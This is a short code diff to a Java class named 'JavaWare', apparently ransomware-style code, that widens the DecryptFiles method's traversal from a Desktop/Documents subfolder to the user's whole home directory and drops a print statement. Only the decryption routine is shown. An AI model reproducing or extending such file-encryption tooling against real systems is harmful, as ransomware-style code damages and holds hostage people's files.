@@ -40,8 +40,7 @@ public class JavaWare {
 
 
     public void DecryptFiles() throws Exception {
-        String home = System.getProperty("user.home") + File.separator + "Desktop" + File.separator + "Documents";
-        System.out.println("Decrypting");
+        String home = System.getProperty("user.home");
         decryptionTraversal(home);
 
     }
